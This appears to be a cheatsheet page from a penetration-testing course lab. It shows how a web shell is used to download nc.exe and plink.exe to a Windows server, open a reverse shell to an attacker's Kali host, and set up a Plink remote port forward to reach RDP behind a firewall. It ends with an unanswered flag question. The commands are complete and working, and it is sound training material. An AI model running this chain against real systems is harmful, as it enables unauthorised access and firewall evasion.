# Plink

MULTISERVER03 behind a firewall, with only port 80 exposed
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Plink-1.png)

Starting Apache2
>``` shell
>kali@kali:~$ sudo systemctl start apache2
>
># ========== Expected Result ==========
>[sudo] password for kali: 
># =====================================
>```

Copying nc.exe to the Apache2 webroot
>``` shell
>kali@kali:~$ find / -name nc.exe 2>/dev/null
>
># ========== Expected Result ==========
>/usr/share/windows-resources/binaries/nc.exe
># =====================================
>
>kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
>```

The PowerShell command we use to download nc.exe to MULTISERVER03 through the web shell
>``` shell
>powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
>```

The Netcat listener on our Kali machine
>``` shell
>kali@kali:~$ nc -nvlp 4446
>
># ========== Expected Result ==========
>listening on [any] 4446 ...
># =====================================
>```

The nc.exe reverse shell payload we execute in the web shell
>``` shell
>C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
>```

The shell from nc.exe caught by our Netcat listener
>``` shell
>...
>listening on [any] 4446 ...
>connect to [192.168.118.4] from (UNKNOWN) [192.168.50.64] 51889
>Microsoft Windows [Version 10.0.20348.825]
>(c) Microsoft Corporation. All rights reserved.
>
>c:\windows\system32\inetsrv>
>```

Copying plink.exe to our Apache2 webroot
>``` shell
>kali@kali:~$ find / -name plink.exe 2>/dev/null
>
># ========== Expected Result ==========
>/usr/share/windows-resources/binaries/plink.exe
># =====================================
>
>kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
>
># ========== Expected Result ==========
>[sudo] password for kali: 
># =====================================
>```

Plink downloaded to the C:\Windows\Temp folder
>``` shell
>c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
>
># ========== Expected Result ==========
>powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
># =====================================
>```

Making an SSH connection to the Kali machine
>``` shell
>c:\windows\system32\inetsrv>C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
>
># ========== Expected Result ==========
>C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
>The host key is not cached for this server:
>  192.168.118.4 (port 22)
>You have no guarantee that the server is the computer
>you think it is.
>The server's ssh-ed25519 key fingerprint is:
>  ssh-ed25519 255 SHA256:q1QQjIxHhSFXfEIT4gYrRF+zKr0bcLMOJljoINxThxY
>If you trust this host, enter "y" to add the key to
>PuTTY's cache and carry on connecting.
>If you want to carry on connecting just once, without
>adding the key to the cache, enter "n".
>If you do not trust this host, press Return to abandon the
>connection.
>Store key in cache? (y/n, Return cancels connection, i for more info) y
>Using username "kali".
>Linux kali 5.16.0-kali7-amd64 #1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01) x86_64
>
>The programs included with the Kali GNU/Linux system are free software;
>the exact distribution terms for each program are described in the
>individual files in /usr/share/doc/*/copyright.
>
>Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
>permitted by applicable law.
>Last login: Sun Aug 21 15:50:39 2022 from 192.168.50.64
>kali@kali:~$ 
># =====================================
>```

Port 9833 opened on the Kali loopback interface
>``` shell
>kali@kali:~$ ss -ntplu
>
># ========== Expected Result ==========
>Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process
>tcp   LISTEN 0      128        127.0.0.1:9833      0.0.0.0:*
>tcp   LISTEN 0      5            0.0.0.0:80        0.0.0.0:*     users:(("python3",pid=1048255,fd=3)) 
>tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*
>tcp   LISTEN 0      128             [::]:22           [::]:*
># =====================================
>```

The traffic flow from the listening port opened on our Kali server to the RDP port open on MULTISERVER03, behind the firewall
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Plink-2.png)

Connecting to the RDP server with xfreerdp, through the Plink port forward
>``` shell
>kali@kali:~$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833 
>
># ========== Expected Result ==========
>...
>Certificate details for 127.0.0.1:9833 (RDP-Server):
>        Common Name: MULTISERVER03
>        Subject:     CN = MULTISERVER03
>        Issuer:      CN = MULTISERVER03
>        Thumbprint:  4a:11:2d:d8:03:8e:dd:5c:f2:c4:71:7e:15:1d:20:fb:62:3f:c6:eb:3d:77:1e:ea:44:47:10:42:49:fa:1e:6a
>The above X.509 certificate could not be verified, possibly because you do not have
>the CA certificate in your certificate store, or the certificate has expired.
>Please look at the OpenSSL documentation on how to add a private CA to the store.
>Do you trust the above certificate? (Y/T/N) y
>[05:11:17:430] [1072332:1072333] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Eastern
>...
># =====================================
>```

Connected to MULTISERVER03 through the remote port forward
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Plink-3.png)

Lab 1 - Follow the steps in this section to gain an RDP connection to MULTISERVER03. What's the flag found in flag.txt file on the rdp_admin's desktop?
>``` shell
>
>```
>
